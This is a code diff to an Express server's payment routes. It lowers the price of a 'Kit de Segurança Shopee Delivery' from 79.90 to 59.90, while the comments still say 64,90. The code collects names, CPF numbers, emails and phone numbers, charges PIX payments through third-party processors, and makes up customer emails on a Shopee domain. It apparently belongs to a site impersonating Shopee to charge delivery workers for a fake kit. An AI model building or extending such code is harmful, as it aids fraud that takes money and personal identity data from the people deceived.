@@ -756,7 +756,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.log('Iniciando proxy para Pagnet...');
       
       // Processar os dados recebidos
-      const { name, cpf, email, phone, amount = 79.90, description = "Kit de Segurança Shopee Delivery" } = req.body;
+      const { name, cpf, email, phone, amount = 59.90, description = "Kit de Segurança Shopee Delivery" } = req.body;
       
       if (!name || !cpf) {
         return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
@@ -1254,7 +1254,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
       
       // Valor fixo para o kit de segurança: R$ 64,90
-      const paymentAmount = 79.90;
+      const paymentAmount = 59.90;
       
       // Usar o email fornecido ou gerar um
       const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
@@ -1595,7 +1595,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const userEmail = email || `${nome.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
       
       // Valor fixo para o kit de segurança: R$ 64,90
-      const paymentAmount = 79.90;
+      const paymentAmount = 59.90;
       
       // Processar pagamento via API For4Payments
       const paymentResult = await paymentService.createPixPayment({
